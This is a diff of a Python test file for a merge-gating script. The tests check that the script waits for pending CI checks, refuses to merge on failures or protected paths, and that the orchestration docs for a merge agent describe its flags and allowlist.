+
+    def go(self, api, wait, kind="working-draft-docs", **kwargs):
+        return go(api, kind=kind, flags=("--wait",), sleep=wait.sleep, clock=wait.clock, **kwargs)
+
+    def test_waits_for_pending_checks_then_merges_with_the_same_pin(self):
+        api = pending_api()
+        wait = FakeWait(api, settle=3)
+        self.assertEqual(self.go(api, wait)[0], 0)
+        self.assertEqual(len(wait.sleeps), 3)
+        self.assertEqual([m[1]["sha"] for m in api.merged], [SHA])
+
+    def test_a_check_that_is_not_reported_yet_counts_as_pending(self):
+        api = make_api(state="blocked", checks=[run("guards"), run("tasks")])
+        self.assertEqual(self.go(api, FakeWait(api, settle=1))[0], 0)
+
+    def test_pending_forever_times_out_without_merging(self):
+        api = pending_api()
+        wait = FakeWait(api)
+        code, text = self.go(api, wait)
+        self.assertEqual(code, 1, text)
+        self.assertEqual(api.merged, [])
+        self.assertRegex(text, r"static.*pending(.|\n)*timed out")
+        self.assertTrue(merge_ready.WAIT_SECONDS <= wait.now <= merge_ready.WAIT_SECONDS + merge_ready.WAIT_POLL)
+
+    def test_a_check_that_goes_red_while_waiting_refuses_and_stops_waiting(self):
+        api = pending_api()
+        wait = FakeWait(api, settle=2, fail=True)
+        code, text = self.go(api, wait)
+        self.assertEqual(code, 1, text)
+        self.assertEqual(len(wait.sleeps), 2)
+        self.assertRegex(text, r"static.*failure")
+        self.assertEqual(api.merged, [])
+
+    def test_other_problems_refuse_at_once_even_when_a_check_is_pending(self):
+        queued = run("static", status="queued", conclusion=None)
+        cases = {"behind": dict(state="behind"), "head moved": dict(sha=OTHER_SHA), "closing keyword": dict(body="fixes #12"),
+                 "path": dict(files=[file_entry("CLAUDE.md")]), "base": dict(base="release"),
+                 "red check": dict(checks=[run("guards"), run("tasks", conclusion="failure"), queued])}
+        for name, kwargs in cases.items():
+            with self.subTest(name):
+                api = make_api(**{"state": "blocked", "checks": [run("guards"), run("tasks"), queued], **kwargs})
+                wait = FakeWait(api)
+                code, _ = self.go(api, wait)
+                self.assertEqual(code, 1)
+                self.assertEqual(wait.sleeps, [], "no waiting while something else is wrong")
+                self.assertEqual(api.merged, [])
+
+
+
 class WiringTests(unittest.TestCase):
     """The tests and the script must run in verify.sh and CI, and the process docs must tell the merge agent to run only the script."""
 
@@ -781,11 +1331,17 @@ class WiringTests(unittest.TestCase):
         self.assertRegex(doc, r"(?is)merge agent.*git ls-remote.*annotated tags dereferenced")
         self.assertRegex(doc, r"(?i)7-day `cooldown`")
 
-    def test_docs_name_every_kind_of_the_script(self):
+    def test_docs_name_every_kind_and_flag_of_the_script(self):
         doc = self.read("docs/ORCHESTRATION.md")
-        for word in sorted(merge_ready.KINDS) + ["standing authorization"]:
+        for word in sorted(merge_ready.KINDS) + ["--wait", "--approval <comment-id>", "batch approval", "standing authorization"]:
             with self.subTest(word=word):
                 self.assertIn(word, doc)
+
+    def test_docs_describe_the_merge_tree_check_not_the_patch_compare(self):  # R1-02
+        doc = self.read("docs/ORCHESTRATION.md")
+        self.assertRegex(doc, r"(?s)update-branch merge commits of `main` whose tree equals git's automatic merge \(`git merge-tree` without conflicts")
+        self.assertRegex(doc, r"hand-resolved conflict")
+        self.assertNotRegex(doc, r"same patch")
 
     R6_ALLOWLIST = (r"kind `general` is fail-closed \(owner decision, #15 comment 7058755858, replacing ruling 1 of #15 comment 7019683156\): only kotlin "
                     r"sources and tests under `app/src/` and `core/<module>/src/`, app resources and docs files that are not owner-only may merge as "
@@ -805,14 +1361,10 @@ class WiringTests(unittest.TestCase):
         self.assertNotRegex(doc.replace("also owner-only for `general`", "also allowed for `general`"), self.R7_RISK)
         self.assertNotRegex(doc.replace("so the pr reviewer stays the main defence", "so no reviewer is needed"), self.R7_RISK)
 
-    def test_docs_record_the_allowlist_and_the_interim_route(self):  # owner decision #15 7058755858, R2-04
+    def test_docs_record_the_allowlist_without_the_interim_route(self):  # owner decision #15 7058755858, R2-04
         doc = re.sub(r"\s+", " ", self.read("docs/ORCHESTRATION.md")).lower()
-        for pattern in (
-                r"for the kinds `working-draft-docs`, `tasks-sync`, `dependabot` and `general` the merge agent runs only",
-                r"until kind `owner-batch` exists, an owner-approved owner-only pr is merged by hand under d1 and d2 \(#15 comment 7007421567\)",
-                self.R6_ALLOWLIST):
-            with self.subTest(pattern=pattern):
-                self.assertRegex(doc, pattern)
+        self.assertNotRegex(doc, r"until kind `owner-batch` exists|merged by hand under d1 and d2")
+        self.assertRegex(doc, self.R6_ALLOWLIST)
 
     def test_the_allowlist_pin_fails_when_the_sentence_is_reversed(self):  # a later 'owner-only' elsewhere must not satisfy it
         doc = re.sub(r"\s+", " ", self.read("docs/ORCHESTRATION.md")).lower()
